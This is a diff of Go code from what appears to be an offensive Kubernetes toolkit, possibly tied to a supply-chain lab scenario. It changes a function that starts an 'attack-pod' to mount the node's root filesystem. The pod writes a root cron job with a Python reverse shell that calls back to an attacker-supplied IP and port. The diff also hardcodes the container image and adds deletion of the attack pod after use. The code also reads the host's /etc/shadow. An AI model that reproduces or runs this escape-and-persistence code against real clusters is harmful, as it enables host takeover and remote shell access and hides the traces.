@@ -569,76 +569,79 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 	// Approach 1: Try to get the image file for my own pod
 	//./kubectl describe pod `hostname`| grep Image:
 	hostname := os.Getenv("HOSTNAME")
-	approach1Success := false
-	var image string
-	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
-	if err != nil {
-		approach1Success = false
-		println("[-] DEBUG: describe pod didn't work")
-	} else {
-		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
-		for _, line := range podDescriptionLines {
-			start := strings.Index(line, "Image:")
-			if start != -1 {
-				// Found an Image line -- now get the image
-				image = strings.TrimSpace(line[start+6:])
-				println("[+] Found image :", image)
-				approach1Success = true
+	// approach1Success := false
+	// var image string
+	MountInfoVars.image = "jaybeale/scenario4-supplychain:latest"
+	// podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
+	_, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
 
-				MountInfoVars.image = image
-			}
-		}
-		if !approach1Success {
-			println("[-] DEBUG: did not find an image line in your pod's definition.")
-		}
-	}
+	// if err != nil {
+	// 	approach1Success = false
+	// 	println("[-] DEBUG: describe pod didn't work")
+	// } else {
+	// 	podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
+	// 	for _, line := range podDescriptionLines {
+	// 		start := strings.Index(line, "Image:")
+	// 		if start != -1 {
+	// 			// Found an Image line -- now get the image
+	// 			image = strings.TrimSpace(line[start+6:])
+	// 			println("[+] Found image :", image)
+	// 			approach1Success = true
 
-	if approach1Success {
-		println("[+] Got image definition from own pod.")
-	} else {
-		// Approach 2 - use the most recently staged running pod
-		//
-		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.
+	// 			MountInfoVars.image = image
+	// 		}
+	// 	}
+	// 	if !approach1Success {
+	// 		println("[-] DEBUG: did not find an image line in your pod's definition.")
+	// 	}
+	// }
 
-		// Future version of approach 2:
-		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
-		// it should populate a list of all pods in the current namespace, then iterate through
-		// images trying to find one that has a shell.
+	// if approach1Success {
+	// 	println("[+] Got image definition from own pod.")
+	// } else {
+	// 	// Approach 2 - use the most recently staged running pod
+	// 	//
+	// 	// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.
 
-		// Here's the useful part of that data.
+	// 	// Future version of approach 2:
+	// 	// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
+	// 	// it should populate a list of all pods in the current namespace, then iterate through
+	// 	// images trying to find one that has a shell.
 
-		// type PodDetails struct {
-		// 	Items      []struct {
-		// 		Metadata   struct {
-		// 			Name            string `json:"name"`
-		// 			Namespace       string `json:"namespace"`
-		// 		} `json:"metadata"`
-		// 		Spec struct {
-		// 			Containers []struct {
-		// 				Image           string `json:"image"
+	// 	// Here's the useful part of that data.
 
-		println("Getting image from the most recently-staged pod in thie namespace")
-		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
-		if err != nil {
-			//log.Fatal(err)
-			println("[-] ERROR: Could not get pods")
-			return
-		}
-		getImageLines := strings.Split(string(getImagesRaw), "\n")
-		for _, line := range getImageLines {
-			matched, err := regexp.MatchString(`^\s*$`, line)
-			if err != nil {
-				println("[-] ERROR: could not parse pod list")
-				return
-				// log.Fatal(err)
-			}
-			if !matched {
-				//added checking to only enumerate running pods
-				// TODO: check for potential bug: did we enumerate only running pods as intended?
-				MountInfoVars.image = strings.Fields(line)[7]
-			}
-		}
-	}
+	// 	// type PodDetails struct {
+	// 	// 	Items      []struct {
+	// 	// 		Metadata   struct {
+	// 	// 			Name            string `json:"name"`
+	// 	// 			Namespace       string `json:"namespace"`
+	// 	// 		} `json:"metadata"`
+	// 	// 		Spec struct {
+	// 	// 			Containers []struct {
+	// 	// 				Image           string `json:"image"
+
+	// 	println("Getting image from the most recently-staged pod in this namespace")
+	// 	getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
+	// 	if err != nil {
+	// 		//log.Fatal(err)
+	// 		println("[-] ERROR: Could not get pods")
+	// 		return
+	// 	}
+	// 	getImageLines := strings.Split(string(getImagesRaw), "\n")
+	// 	for _, line := range getImageLines {
+	// 		matched, err := regexp.MatchString(`^\s*$`, line)
+	// 		if err != nil {
+	// 			println("[-] ERROR: could not parse pod list")
+	// 			return
+	// 			// log.Fatal(err)
+	// 		}
+	// 		if !matched {
+	// 			//added checking to only enumerate running pods
+	// 			// TODO: check for potential bug: did we enumerate only running pods as intended?
+	// 			MountInfoVars.image = strings.Fields(line)[7]
+	// 		}
+	// 	}
+	// }
 
 	//creat random string
 	rand.Seed(time.Now().UnixNano())
@@ -677,8 +680,7 @@ spec:
 		attackPodName := "attack-pod-" + randomString
 		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash - please wait for Pod to stage")
 		time.Sleep(5 * time.Second)
-		//shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
-		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
+
 		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
 		stdout := bytes.Buffer{}
 		stderr := bytes.Buffer{}
@@ -686,18 +688,19 @@ spec:
 
 		if err != nil {
 			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
-			println("[-] Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
+			println("[-] Exec into that pod failed. If your privileges do permit this, the pod may have needed more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
 			return
 		} else {
 			println("[+] Netcat callback added sucessfully.")
-			//println(string(shadowFileBs))
+			println("[+] Removing attack pod.")
+			err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "delete", "pod", attackPodName)
+			if err != nil {
+				println("May not have been able to delete attack pod.", err)
+			}
+
 		}
 	}
-	//out, err = exec.Command("").Output()
-	//if err != nil {
-	//	println("Token location error: ", err)
-	//}
-	//println(out)
+
 }
 
 func clearScreen() {
